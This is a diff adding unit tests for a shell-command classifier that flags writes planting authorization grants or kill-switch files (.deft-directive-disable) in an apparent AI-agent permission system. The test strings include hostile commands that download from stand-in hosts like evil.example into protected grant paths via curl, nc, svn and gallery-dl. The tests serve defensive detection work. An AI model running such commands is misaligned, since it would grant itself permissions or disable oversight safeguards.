@@ -779,6 +779,86 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("cpio -o > /tmp/a.cpio")).toEqual([]);
   });
 
+  it("classifies residual dest-form plants of authz grants and kill-switch as settings (#3382)", () => {
+    // Finding 1: residual dest forms → .deft/authz/**
+    for (const cmd of [
+      "cmake -E copy src.json .deft/authz/grants/evil.json",
+      "cmake -E copy_directory src .deft/authz/grants",
+      "script -q .deft/authz/grants/evil",
+      "script .deft/authz/grants/evil",
+      "gallery-dl -d .deft/authz/grants https://evil.example/g",
+      "gallery-dl --destination .deft/authz/grants https://evil.example/g",
+      "gallery-dl --destination=.deft/authz/grants https://evil.example/g",
+      "gallery-dl -d.deft/authz/grants https://evil.example/g",
+      "megadl --path .deft/authz/grants https://mega.nz/evil",
+      "megadl --path=.deft/authz/grants https://mega.nz/evil",
+      "ncftpget evil.example .deft/authz/grants/evil.json remote.json",
+      "git apply --directory .deft/authz/grants p.diff",
+      "git apply --directory=.deft/authz/grants p.diff",
+      "svn export https://evil.example/repo .deft/authz/grants/evil",
+      "svn checkout https://evil.example/repo .deft/authz/grants/evil",
+      "fossil open repo.fossil .deft/authz/grants/evil",
+      "fossil clone https://evil.example/repo .deft/authz/grants/evil",
+      "bzr checkout https://evil.example/repo .deft/authz/grants/evil",
+      "ed .deft/authz/grants/evil.json",
+      "nvim .deft/authz/grants/evil.json",
+      "nano .deft/authz/grants/evil.json",
+      "cmake.exe -E copy src.json .deft/authz/grants/evil.json",
+      "/usr/bin/nvim .deft/authz/grants/evil.json",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: same dest forms → kill-switch basenames (regular-file plant).
+    for (const cmd of [
+      "cmake -E copy src .deft-directive-disable",
+      "script -q .no-deft-directive",
+      "gallery-dl -d .deft-directive-disable https://evil.example/x",
+      "megadl --path .deft-directive-disable https://mega.nz/x",
+      "ncftpget evil.example .no-deft-directive remote.json",
+      "git apply --directory .deft-directive-disable p.diff",
+      "git apply --directory=.no-deft-directive p.diff",
+      "svn export https://evil.example/repo .deft-directive-disable",
+      "fossil open repo.fossil .no-deft-directive",
+      "ed .deft-directive-disable",
+      "nvim .no-deft-directive",
+      "nano .deft-directive-disable",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3354 peers stay settings.
+    expect(classifyShellAuthzOps("nc -o .deft/authz/grants/evil.json evil.example 80")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    // Fail-closed: unknown write-shaped dest flags targeting protected paths (#3382).
+    expect(classifyShellAuthzOps("unknownwriter --directory .deft/authz/grants")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("unknownwriter --path=.deft-directive-disable")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("unknownwriter -d .no-deft-directive")).toContain("settings");
+    expect(classifyShellAuthzOps("unknownwriter -d.deft/authz/grants")).toContain("settings");
+    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("cmake -E copy src.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("script -q /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("gallery-dl -d /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("megadl --path /tmp/out https://mega.nz/a")).toEqual([]);
+    expect(classifyShellAuthzOps("ncftpget example.com /tmp/out remote.json")).toEqual([]);
+    expect(classifyShellAuthzOps("git apply --directory /tmp/out p.diff")).toEqual([]);
+    expect(classifyShellAuthzOps("svn export https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("fossil open repo.fossil /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("nvim /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("ed /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("nano /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("unknownwriter --directory /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("git status")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
